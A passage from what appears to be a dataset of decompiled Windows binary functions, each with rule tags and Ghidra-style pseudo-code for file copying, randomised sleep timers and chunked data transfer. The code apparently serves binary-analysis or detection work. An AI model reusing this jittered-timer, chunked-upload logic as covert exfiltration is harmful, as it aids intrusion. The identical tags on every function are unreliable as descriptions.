arg_ch;\n            do {\n                cVar2 = *var_270h;\n                var_270h = var_270h + 1;\n            } while (cVar2 != '\\0');\n            var_284h = &uStack541;\n            do {\n                pcVar1 = var_284h + 1;\n                var_284h = var_284h + 1;\n            } while (*pcVar1 != '\\0');\n            puVar6 = arg_ch;\n            for (uVar5 = var_270h - arg_ch >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *var_284h = *puVar6;\n                puVar6 = puVar6 + 1;\n                var_284h = var_284h + 1;\n            }\n            for (uVar5 = var_270h - arg_ch & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n                *var_284h = *puVar6;\n                puVar6 = puVar6 + 1;\n                var_284h = var_284h + 1;\n            }\n        }\n        else {\n            var_28ch = arg_ch;\n            var_290h = var_4h;\n            do {\n                cVar2 = *var_28ch;\n                *var_290h = cVar2;\n                var_28ch = var_28ch + 1;\n                var_290h = var_290h + 1;\n            } while (cVar2 != '\\0');\n        }\n        iVar4 = fcn.00035c70(&var_218h, &var_23ch);\n        if ((iVar4 == -1) || (var_228h == 0)) {\n            uVar3 = 0xffffffff;\n        }\n        else {\n            iVar4 = fcn.00035c70(arg_8h, &var_23ch);\n            if (iVar4 == 0) {\n                var_29ch = arg_8h;\n                var_2a0h = &var_110h;\n                do {\n                    cVar2 = *var_29ch;\n                    *var_2a0h = cVar2;\n                    var_29ch = var_29ch + 1;\n                    var_2a0h = var_2a0h + 1;\n                } while (cVar2 != '\\0');\n                var_4h = fcn.000251b0(&var_110h);\n                if (var_4h == NULL) {\n                    var_2ach = 0xb1be15e0;\n                    pcVar1 = var_2ach;\n                    do {\n                        var_2ach = pcVar1;\n                        pcVar1 = var_2ach + 1;\n                    } while (*var_2ach != '\\0');\n                    var_2c0h = &uStack277;\n                    do {\n                        pcVar1 = var_2c0h + 1;\n                        var_2c0h = var_2c0h + 1;\n                    } while (*pcVar1 != '\\0');\n                    puVar6 = 0xb1be15e0;\n                    for (uVar5 = var_2ach + 0x4e41ea21 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n                        *var_2c0h = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        var_2c0h = var_2c0h + 1;\n                    }\n                    for (uVar5 = var_2ach + 0x4e41ea21 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n                        *var_2c0h = *puVar6;\n                        puVar6 = puVar6 + 1;\n                        var_2c0h = var_2c0h + 1;\n                    }\n                }\n                else {\n                    var_2c8h = 0xb1be15e0;\n                    var_2cch = var_4h;\n                    do {\n                        cVar2 = *var_2c8h;\n                        *var_2cch = cVar2;\n                        var_2c8h = var_2c8h + 1;\n                        var_2cch = var_2cch + 1;\n                    } while (cVar2 != '\\0');\n                }\n                iVar4 = fcn.00035c70(&var_110h, &var_23ch);\n                if ((iVar4 == 0) && (iVar4 = fcn.00035e00(&var_110h),  iVar4 == -1)) {\n                    return 0xffffffff;\n                }\n                iVar4 = fcn.000366f0(arg_8h, &var_110h);\n                if (iVar4 == -1) {\n                    return 0xffffffff;\n                }\n                iVar4 = fcn.000250c0(&var_218h, arg_8h);\n                if (iVar4 == -1) {\n                    fcn.00035e00(arg_8h);\n                    fcn.000366f0(&var_110h, arg_8h);\n                    return 0xffffffff;\n                }\n            }\n            else {\n                iVar4 = fcn.000250c0(&var_218h, arg_8h);\n                if (iVar4 == -1) {\n                    return 0xffffffff;\n                }\n            }\n            if (arg_10h != 0) {\n                fcn.00035e00(&var_218h);\n            }\n            uVar3 = 0;\n        }\n    }\n    else {\n        uVar3 = 0xffffffff;\n    }\n    return uVar3;\n}\n",
        "token_count": 1880
    },
    "000250c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000250c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_810h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00035690(arg_8h, 0xb1be15e8);\n    if (var_4h != 0) {\n        var_ch = fcn.00035690(arg_ch, 0xb1be15ec);\n        if (var_ch == 0) {\n            fcn.00035b40(var_4h);\n        }\n        else {\n            do {\n                var_8h = fcn.000358b0(&var_810h, 1, 0x800, var_4h);\n                if (var_8h == 0) {\n                    fcn.00035b40(var_4h);\n                    fcn.00035b40(var_ch);\n                    return 0;\n                }\n                iVar1 = fcn.00035840(&var_810h, 1, var_8h, var_ch);\n            } while (iVar1 == var_8h);\n            fcn.00035b40(var_4h);\n            fcn.00035b40(var_ch);\n            fcn.00035e00(arg_ch);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 312
    },
    "000251b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000251b0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.00078658(arg_8h, 0x2e);\n    uVar1 = fcn.00078658(arg_8h, 0x5c);\n    if (((var_4h != 0) && (uVar1 != 0)) && (var_4h < uVar1)) {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 141
    },
    "000252e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000252e0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00029470(0xdf, 300000);\n    uVar2 = fcn.00029470(0xe0, 9000000);\n    if (uVar1 < uVar2) {\n        uVar3 = fcn.000785f8();\n        var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n    }\n    else {\n        uVar3 = fcn.000785f8();\n        var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n    }\n    iVar4 = fcn.000340e0(0xb1c68608, var_ch >> 1);\n    if (iVar4 != -1) {\n        do {\n            if (*0xb1c685fc != 0) break;\n            fcn.000255e0();\n            if (uVar1 < uVar2) {\n                uVar3 = fcn.000785f8();\n                var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n            }\n            else {\n                uVar3 = fcn.000785f8();\n                var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n            }\n            iVar4 = fcn.000340e0(0xb1c68608, var_ch);\n        } while (iVar4 != -1);\n        fcn.000340b0(0xb1c685f4);\n    }\n    return 0;\n}\n",
        "token_count": 418
    },
    "000253e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000253e0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00029470(0xdf, 300000);\n    uVar2 = fcn.00029470(0xe0, 9000000);\n    if (uVar1 < uVar2) {\n        uVar3 = fcn.000785f8();\n        var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n    }\n    else {\n        uVar3 = fcn.000785f8();\n        var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n    }\n    iVar4 = fcn.000340e0(0xb1c685f8, var_ch >> 1);\n    if (iVar4 != -1) {\n        do {\n            if (*0xb1c685fc != 0) break;\n            fcn.00026020();\n            if (uVar1 < uVar2) {\n                uVar3 = fcn.000785f8();\n                var_ch = uVar3 % ((uVar2 - uVar1) + 1) + uVar1;\n            }\n            else {\n                uVar3 = fcn.000785f8();\n                var_ch = uVar3 % ((uVar1 - uVar2) + 1) + uVar2;\n            }\n            iVar4 = fcn.000340e0(0xb1c685f8, var_ch);\n        } while (iVar4 != -1);\n        fcn.000340b0(0xb1c68724);\n    }\n    return 0;\n}\n",
        "token_count": 418
    },
    "000254e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.000254e0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00029470(0xdf, 300000);\n    uVar2 = fcn.00029470(0xe0, 9000000);\n    var_8h = fcn.0006be20();\n    var_10h = uVar1;\n    while ((iVar3 = fcn.000340e0(*0xb1c68728, 0xffffffff),  iVar3 != -1 && (*0xb1c685fc == 0))) {\n        fcn.00025e50();\n        iVar3 = fcn.0006be20();\n        if (iVar3 - var_8h < uVar1) {\n            fcn.000209a0(1000);\n        }\n        else {\n            fcn.00026020();\n            iVar3 = fcn.0006be20();\n            if (var_10h <= iVar3 - var_8h) {\n                fcn.000255e0();\n                fcn.00026020();\n                if (uVar1 < uVar2) {\n                    uVar4 = fcn.000785f8();\n                    var_10h = uVar4 % ((uVar2 - uVar1) + 1) + uVar1;\n                }\n                else {\n                    uVar4 = fcn.000785f8();\n                    var_10h = uVar4 % ((uVar1 - uVar2) + 1) + uVar2;\n                }\n                var_8h = fcn.0006be20();\n            }\n        }\n    }\n    fcn.000340b0(0xb1c68600);\n    return 0;\n}\n",
        "token_count": 433
    },
    "000255e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_f0h\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.000255e0(void)\n\n{\n    uint arg_18h;\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t var_f0h;\n    uint32_t var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    int32_t var_e0h;\n    int32_t var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint32_t var_d0h;\n    uint32_t var_cch;\n    int32_t var_c8h;\n    uint32_t var_c4h;\n    uint32_t var_c0h;\n    uint32_t var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint32_t var_a4h;\n    uint32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint32_t var_53h;\n    uint var_4fh;\n    uint32_t var_4bh;\n    uint32_t var_47h;\n    int32_t var_42h;\n    uint var_3eh;\n    uint var_3ah;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_b4h = 0;\n    var_bch = 0;\n    var_d0h = 0;\n    *0xb1c685f0 = 0;\n    do {\n        var_e0h = 0;\n        var_c8h = 0;\n        fcn.00078790(&var_68h, 0, 0x52);\n        var_70h = fcn.00029470(1, 0);\n        arg_18h = fcn.00029470(400, 20000);\n        var_d4h = fcn.00029470(0xe1, 0x1000);\n        var_6ch = fcn.00029470(0xe2, 0x10000);\n        var_47h._0_1_ = 1;\n        iVar1 = fcn.00029470(2, 0);\n        var_4bh = iVar1 + 1;\n        var_cch = 0;\n        var_c0h = 0;\n        while (iVar1 = fcn.000235a0(var_70h, 0, 0, &var_b0h),  iVar1 == 0) {\n            if (var_80h < var_84h) {\n                var_4bh = var_a4h;\n                var_47h._0_1_ = 0;\n                stack0xffffffb6 = var_80h;\n                var_42h = var_84h - var_80h;\n                var_b4h = var_ach;\n                var_c8h = 1;\n                var_cch = var_a4h;\n                var_c0h = var_80h;\n                var_bch = var_84h;\n                break;\n            }\n            fcn.00025c00(var_70h, var_ach, var_84h, var_a4h);\n        }\n        if ((*0xb1c685f0 == 0) && (var_dch = fcn.000266c0(0xb1c685f0, 0, &var_d0h),  var_dch != 0)) break;\n        var_60h._0_1_ = 1;\n        var_64h = var_70h | 0x80000000;\n        var_53h = var_70h;\n        var_4fh = 0;\n        var_47h._0_1_ = var_47h | 0x1a;\n        var_3eh = var_d4h;\n        var_3ah = var_6ch;\n        fcn.00026b30(&var_68h);\n        fcn.00026bb0(&var_53h);\n        var_dch = fcn.00077620(*0xb1c685f0, 0xb, &var_68h, 0x52, &var_ch, 0);\n        if (var_dch != 0) {\n            if (var_cch == 0) {\n                var_ech = var_d0h | 0x80000000;\n            }\n            else {\n                var_ech = var_cch;\n            }\n            fcn.00029970(2, 0, var_dch, 0, var_ech);\n            break;\n        }\n        var_dch = fcn.000776f0(*0xb1c685f0, var_ch, &var_e0h, &var_c4h, arg_18h, 0);\n        if (var_dch == 0) {\n            if (var_c4h < 0x40) {\n                var_dch = 0x215901f5;\n                if (var_cch == 0) {\n                    var_f0h = var_d0h | 0x80000000;\n                }\n                else {\n                    var_f0h = var_cch;\n                }\n                fcn.00029970(2, 0, 0x215901f5, 0, var_f0h);\n                fcn.00077a60(*0xb1c685f0, var_ch);\n                break;\n            }\n            fcn.00025200(var_e0h);\n            if (*(var_e0h + 0x30) < *(var_e0h + 0x2c)) {\n                fcn.00077a60(*0xb1c685f0, var_ch);\n                break;\n            }\n            if (var_c8h == 0) {\n                var_cch = *(var_e0h + 0xc);\n                var_bch = *(var_e0h + 0x2c);\n                var_4h = fcn.00023620(var_70h, 0, var_cch, var_bch, 0, &var_b4h);\n                if (var_4h != 0) {\n                    fcn.00029970(2, 0, var_4h + 0x191U | 0x21590000, 0, var_cch);\n                    fcn.00077a60(*0xb1c685f0, var_ch);\n                    break;\n                }\n            }\n            while (var_dch = fcn.000776f0(*0xb1c685f0, var_ch, &var_d8h, &var_b8h, arg_18h, 0),  var_dch == 0) {\n                if (var_b8h == 0) goto code_r0x00025a62;\n                var_4h = fcn.00023660(var_70h, 0, var_b4h, var_c0h, var_d8h, var_b8h);\n                fcn.000779e0(*0xb1c685f0, var_d8h);\n                if (var_4h != 0) {\n                    fcn.00029970(2, 0, var_dch, 0, var_cch);\n                    goto code_r0x00025a62;\n                }\n                var_c0h = var_c0h + var_b8h;\n            }\n            fcn.00029970(2, 0, var_dch, 0, var_cch);\n        }\ncode_r0x00025a62:\n        bVar2 = false;\n        var_dch = fcn.000778d0(*0xb1c685f0, var_ch, &var_8h, &var_d8h, &var_b8h, arg_18h, 0);\n        if (var_dch == 0) {\n            if (var_8h == 0) {\n                bVar2 = var_c0h != var_bch;\n                if (bVar2) {\n                    fcn.00029970(2, 0, 0x215901f6, 0, var_cch);\n                    fcn.000236f0(var_70h, 0, var_b4h);\n                }\n                else {\n                    fcn.00025c00(var_70h, var_b4h, var_bch, var_cch);\n                }\n                bVar2 = !bVar2;\n            }\n            else {\n                if ((var_8h == 0x21590196) && (var_c8h != 0)) {\n                    fcn.000236f0(var_70h, 0, var_b4h);\n                    fcn.00029970(2, 0, var_8h, 0, var_cch);\n                }\n                if ((var_8h != 0x21590196) && (var_8h != 0x21590192)) {\n                    fcn.00029970(2, 0, var_8h, 0, var_cch);\n                }\n            }\n            fcn.000779e0(*0xb1c685f0, var_d8h);\n        }\n        else {\n            fcn.00029970(2, 0, var_dch, 0, var_cch);\n        }\n        fcn.000779e0(*0xb1c685f0, var_e0h);\n        var_e0h = 0;\n    } while (bVar2);\n    if (*0xb1c685f0 != 0) {\n        fcn.000779e0(*0xb1c685f0, var_e0h);\n        fcn.00077140(0xb1c685f0, 0);\n    }\n    return;\n}\n",
        "token_count": 2210
    },
    "00025c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00025c00(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = 0;\n    var_14h = 0;\n    var_18h = 0;\n    var_10h = fcn.00035200(arg_10h);\n    if (var_10h == NULL) {\n        fcn.00029970(3, 0, 0x21590004, 0, arg_14h);\n    }\n    else {\n        var_28h = fcn.00029470(2, 0);\n        if (var_28h < arg_14h) {\n            var_ch = fcn.000236a0(arg_8h, 0, arg_ch, 0, var_10h, arg_10h, &arg_10h);\n            if (var_ch == 0) {\n                if (arg_10h < 0x15) {\n                    fcn.00029970(3, 0, 0x21590064, 0, arg_14h);\n                }\n                else {\n                    var_40h = *var_10h;\n                    var_3ch = var_10h[1];\n                    var_38h = var_10h[2];\n                    var_34h = var_10h[3];\n                    var_30h = var_10h[4];\n                    var_2ch._0_1_ = *(var_10h + 5);\n                    fcn.00026b30(&var_40h);\n                    if (arg_14h == var_3ch) {\n                        var_20h = 0xb1c59518;\n                        if ((var_38h == '\\x02') || (var_38h == '\\x01')) {\n                            var_18h = 1;\n                            fcn.000236f0(arg_8h, 0, arg_ch);\n                        }\n                        var_8h = 0;\n                        var_4h = 0;\n                        var_24h = fcn.00026da0(&var_20h, var_40h, var_10h + 0x15, arg_10h - 0x15, &var_1ch, &var_14h, \n                                               &var_40h);\n                        if (var_18h != 0) {\n                            iVar1 = fcn.00037240(&var_8h);\n                            if (iVar1 != 0) {\n                                var_48h = 3600000;\n                                var_44h = 0;\n                                _var_48h = fcn.00078778(3600000, 0, 10000, 0);\n                                iVar1 = fcn.000785ec(var_8h, 0, &var_48h);\n                                if (iVar1 == 0x102) {\n                                    fcn.00029970(0xc, 0, 0x21590002, var_40h, var_3ch);\n                                }\n                                fcn.00037220(&var_8h);\n                            }\n                        }\n                        fcn.00035330(var_1ch);\n                        fcn.000294b0(2, arg_14h);\n                    }\n                    else {\n                        fcn.00029970(3, 0, 0x21590064, 0, arg_14h);\n                    }\n                }\n            }\n            else {\n                fcn.00029970(3, 0, var_ch + 0x191U | 0x21590000, 0, arg_14h);\n            }\n        }\n        else {\n            fcn.00029970(3, 0, 0x215901f7, 0, arg_14h);\n        }\n    }\n    fcn.00035330(var_10h);\n    if (var_18h == 0) {\n        fcn.000236f0(arg_8h, 0, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 1037
    },
    "00026020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Variable defined which should be unmapped: var_e4h\n// WARNING: Variable defined which should be unmapped: var_e0h\n// WARNING: Variable defined which should be unmapped: var_dch\n// WARNING: Variable defined which should be unmapped: var_d8h\n// WARNING: Variable defined which should be unmapped: var_d4h\n// WARNING: Variable defined which should be unmapped: var_d0h\n// WARNING: Variable defined which should be unmapped: var_cch\n// WARNING: Variable defined which should be unmapped: var_f0h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00026020(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *var_f0h;\n    int32_t var_ech;\n    int32_t var_e8h;\n    uint *var_e4h;\n    int32_t var_e0h;\n    uint *var_dch;\n    uint *var_d8h;\n    uint *var_d4h;\n    uint *var_d0h;\n    uint *var_cch;\n    uint *var_c8h;\n    uint *var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint *var_b4h;\n    int32_t var_b0h;\n    uint *var_94h;\n    uint *var_90h;\n    int32_t var_7ch;\n    uint32_t var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint32_t var_6ch;\n    uint var_68h;\n    uint var_5bh;\n    uint var_57h;\n    uint *var_53h;\n    uint *var_4fh;\n    int32_t var_4ah;\n    uint *var_3eh;\n    int32_t var_3ah;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_ech = 0;\n    var_e0h = 0;\n    var_78h = fcn.00029470(1, 0);\n    var_f0h = fcn.00029470(400, 20000);\n    var_4h = fcn.00029470(0x143, 0x1000);\n    var_d8h = fcn.00029470(0x144, 0x10000);\n    var_8h = fcn.00023560(0xffffffff, 1, &fcn.00026020::var_c4h, &fcn.00026020::var_14h);\n    if (var_8h != 0) {\n        fcn.00029970(4, 0, var_8h + 0x191U | 0x21590000, 0, 0);\n        return;\n    }\n    var_ch = 0;\n    var_10h = NULL;\ncode_r0x000260d2:\n    do {\n        if (var_c4h <= var_10h) {\ncode_r0x00026689:\n            fcn.00023800(var_14h);\n            if (var_ech == 0) {\n                return;\n            }\n            fcn.000779e0(var_ech, var_e0h);\n            fcn.00077140(&fcn.00026020::var_ech, 0);\n            return;\n        }\n        iVar1 = fcn.000235e0(*(var_14h + var_10h * 0x40), *(var_14h + 8 + var_10h * 0x40), \n                             *(var_14h + 4 + var_10h * 0x40), &fcn.00026020::var_c0h);\n        if (iVar1 != 0) {\n            var_10h = var_10h + 1;\n            goto code_r0x000260d2;\n        }\n        if (var_90h == var_94h) {\n            var_dch = var_b4h;\n            if ((var_ech == 0) && (var_e4h = fcn.000266c0(&fcn.00026020::var_ech, 1, 0),  var_e4h != NULL)) {\n                if (var_e4h != 0x21590064) {\n                    fcn.00029970(4, 0, var_e4h, 0, var_dch);\n                }\n                goto code_r0x00026689;\n            }\n            var_c4h = 0x52;\n            var_c8h = NULL;\n            var_cch = &fcn.00026020::var_70h;\n            var_d0h = 0x261a9;\n            fcn.00078790();\n            var_68h._0_1_ = 2;\n            var_6ch = var_78h | 0x80000000;\n            var_5bh = 0xffffffff;\n            var_57h = 1;\n            var_53h = var_dch;\n            var_4fh._0_1_ = 4;\n            var_c4h = &fcn.00026020::var_70h;\n            var_c8h = 0x261e0;\n            fcn.00026b30(var_c4h);\n            var_c8h = &fcn.00026020::var_5bh;\n            var_cch = 0x261e9;\n            fcn.00026bb0(var_c8h);\n            var_cch = NULL;\n            var_d0h = var_f0h;\n            var_d4h = &fcn.00026020::var_d0h;\n            var_d8h = &fcn.00026020::var_e0h;\n            var_dch = &fcn.00026020::var_18h;\n            var_e0h = 0x52;\n            var_e4h = &fcn.00026020::var_70h;\n            var_e8h = 0xb;\n            var_e4h = fcn.00077500(var_ech, 0xb, var_e4h, 0x52, var_dch, var_d8h, var_d4h, var_f0h, 0);\n            if (var_e4h != NULL) {\n                fcn.00029970(4, 0, var_e4h, 0, var_dch);\n                goto code_r0x00026689;\n            }\n            var_f0h = 0x52;\n            fcn.00078790(&fcn.00026020::var_70h, 0);\n            if (var_18h == 0) {\n                if (var_d0h < 0x40) {\n                    fcn.00029970(4, 0, 0x215901f5, 0, var_dch);\n                    goto code_r0x00026689;\n                }\n                var_ech = var_e0h;\n                fcn.00025200(var_e0h);\n                if ((*(var_e0h + 0x2c) != var_94h) || (*(var_e0h + 0x10) != var_b0h)) {\n                    fcn.00029970(4, 0, 0x21590202, 0, var_dch);\n                    fcn.000779e0(var_ech, var_e0h);\n                    var_e0h = 0;\n                    var_10h = var_10h + 1;\n                    goto code_r0x000260d2;\n                }\n                var_c8h = *(var_e0h + 0x30);\n            }\n            else {\n                var_c8h = NULL;\n                var_4fh._0_1_ = 1;\n                var_3ah = var_b0h;\n            }\n            var_68h._0_1_ = 1;\n            var_6ch = var_78h | 0x80000000;\n            var_5bh = 0xffffffff;\n            var_57h = 1;\n            var_53h = var_dch;\n            stack0xffffffae = var_c8h;\n            var_4ah = var_90h - var_c8h;\n            var_3eh = var_94h;\n            var_f0h = &fcn.00026020::var_70h;\n            fcn.00026b30(var_f0h);\n            fcn.00026bb0(&fcn.00026020::var_5bh);\n            var_e4h = fcn.00077620(var_ech, 0xc, &fcn.00026020::var_70h, 0x52, &fcn.00026020::var_74h, 0);\n            if (var_e4h != NULL) {\n                fcn.00029970(4, 0, var_e4h, 0, var_dch);\n                goto code_r0x00026689;\n            }\n            var_d4h = fcn.00035200(var_d8h);\n            if (var_d4h == NULL) {\n                fcn.00029970(4, 0, 0x21590004, 0, var_dch);\n                goto code_r0x00026689;\n            }\n            var_e4h = NULL;\n            for (; var_c8h < var_90h; var_c8h = var_c8h + var_7ch) {\n                if (var_4h < var_d8h) {\n                    uVar2 = fcn.000785f8();\n                    var_7ch = uVar2 % (var_d8h + (1 - var_4h)) + var_4h;\n                }\n                else {\n                    uVar2 = fcn.000785f8();\n                    var_7ch = uVar2 % (var_4h + (1 - var_d8h)) + var_d8h;\n                }\n                if (var_90h < var_7ch + var_c8h) {\n                    var_7ch = var_90h - var_c8h;\n                }\n                var_8h = fcn.000236a0(0xffffffff, 1, var_bch, var_c8h, var_d4h, var_7ch, &fcn.00026020::var_7ch);\n                if (var_8h != 0) {\n                    var_e4h = var_8h + 0x191U | 0x21590000;\n                    fcn.00029970(4, 0, var_e4h, 0, var_dch);\n                    break;\n                }\n                var_e4h = fcn.00077800(var_ech, var_74h, var_d4h, var_7ch, 0);\n                if (var_e4h != NULL) {\n                    fcn.00029970(4, 0, var_e4h, 0, var_dch);\n                    break;\n                }\n            }\n            fcn.00035330(var_d4h);\n            if ((var_e4h == NULL) && (var_e4h = fcn.00077800(var_ech, var_74h, 0, 0, 0),  var_e4h != NULL)) {\n                fcn.00029970(4, 0, var_e4h, 0, var_dch);\n            }\n            var_e8h = 0;\n            var_e4h = fcn.000778d0(var_ech, var_74h, &fcn.00026020::var_18h, &fcn.00026020::var_d4h, \n                                   &fcn.00026020::var_cch, var_f0h, 0);\n            fcn.00029970(4, var_18h, var_e4h, 0, var_dch);\n            if ((var_e4h == NULL) && (fcn.000779e0(var_ech, var_d4h),  var_18h == 0)) {\n                fcn.000236f0(0xffffffff, 1, var_bch);\n                var_e8h = 1;\n                fcn.00026ac0(var_dch);\n            }\n            fcn.000779e0(var_ech, var_e0h);\n            var_e0h = 0;\n            if (var_e8h == 0) {\n                if (var_ch < 3) {\n                    var_ch = var_ch + 1;\n                    var_e8h = 0;\n                }\n            }\n            else {\n                var_ch = 0;\n            }\n            if (var_e8h != 0) {\n                var_10h = var_10h + 1;\n            }\n            goto code_r0x000260d2;\n        }\n        var_10h = var_10h + 1;\n    } while( true );\n}\n",
        "token_count": 2919
    },
    "000266c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000266c0(uint *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    char *arg_ch_00;\n    char *arg_8h_00;\n    uint var_1dch;\n    char *var_1d8h;\n    uint *var_1d4h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint *var_1c4h;\n    uint var_1c0h;\n    uint var_1b8h;\n    char *var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    char *var_1a8h;\n    uint var_1a4h;\n    int32_t var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_118h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        var_1a0h = fcn.00029470(200, 0);\n    }\n    else {\n        var_1a0h = fcn.00029470(300, 0);\n    }\n    if (var_1a0h == 0) {\n        uVar2 = 0x21590064;\n    }\n    else {\n        var_8h = fcn.000785f8();\n        var_8h = var_8h % var_1a0h;\n        if (arg_ch == 0) {\n            var_4h = fcn.00029090(var_8h + 0xc9, &var_198h, 0x80, &var_ch);\n        }\n        else {\n            var_4h = fcn.00029090(var_8h + 0x12d, &var_198h, 0x80, &var_ch);\n        }\n        if (var_4h == 0) {\n            var_118h._0_1_ = '\\0';\n            if (arg_ch == 0) {\n                fcn.00029090(var_8h + 0xd4, &var_118h, 0x100, &var_ch);\n            }\n            else {\n                fcn.00029090(var_8h + 0x138, &var_118h, 0x100, &var_ch);\n            }\n            puVar3 = fcn.000785ce(&var_198h, 0x2f);\n            if (puVar3 == NULL) {\n                uVar2 = 0x21590064;\n            }\n            else {\n                